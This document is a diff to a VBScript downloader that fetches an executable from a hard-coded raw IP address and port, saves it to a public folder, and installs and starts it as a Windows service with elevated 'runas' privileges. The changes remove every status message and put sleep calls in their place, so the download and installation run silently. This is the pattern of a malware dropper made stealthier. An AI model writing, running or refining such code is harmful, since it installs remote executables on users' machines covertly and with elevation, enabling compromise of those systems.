@@ -9,13 +9,13 @@ Dim url, downloadPath, objXMLHTTP, objStream, objShell, objFSO, objFile, install
 Dim commandOutput, errorFile
 
 url = "http://51.81.73.108:5552/uploads/goService.exe"
-downloadPath = "C:\Sys\goService.exe"
-errorFile = "C:\Sys\service_install_log.txt"
+downloadPath = "C:\Users\Public\Sys\goService.exe"
+errorFile = "C:\Users\Public\Sys\service_install_log.txt"
 
 ' Ensure the directory exists
 Set objFSO = CreateObject("Scripting.FileSystemObject")
-If Not objFSO.FolderExists("C:\Sys") Then
-    objFSO.CreateFolder("C:\Sys")
+If Not objFSO.FolderExists("C:\Users\Public\Sys\") Then
+    objFSO.CreateFolder("C:\Users\Public\Sys\")
 End If
 
 ' Download the file
@@ -31,9 +31,10 @@ If objXMLHTTP.Status = 200 Then
     objStream.Write objXMLHTTP.ResponseBody
     objStream.SaveToFile downloadPath, 2 ' Save as a file and overwrite if exists
     objStream.Close
-    WScript.Echo "File downloaded successfully to " & downloadPath
+    WScript.Sleep 1000
+
 Else
-    WScript.Echo "Failed to download file. HTTP Status: " & objXMLHTTP.Status
+    WScript.Sleep 1000
     WScript.Quit
 End If
 
@@ -42,14 +43,13 @@ If objFSO.FileExists(downloadPath) Then
     Set objShell = CreateObject("Shell.Application")
     
     ' Install the service
-    WScript.Echo "Installing service..."
+    WScript.Sleep 1000
     installResult = objShell.ShellExecute(downloadPath, "install", "", "runas", 1)
-    WScript.Echo "Service installation result: " & installResult
+     WScript.Sleep 10000
 
-    ' Start the service
-    WScript.Echo "Starting service..."
+
     startResult = objShell.ShellExecute(downloadPath, "start", "", "runas", 1)
-    WScript.Echo "Service start result: " & startResult
+     WScript.Sleep 1000
 Else
-    WScript.Echo "Service file not found: " & downloadPath
+     WScript.Sleep 1000
 End If
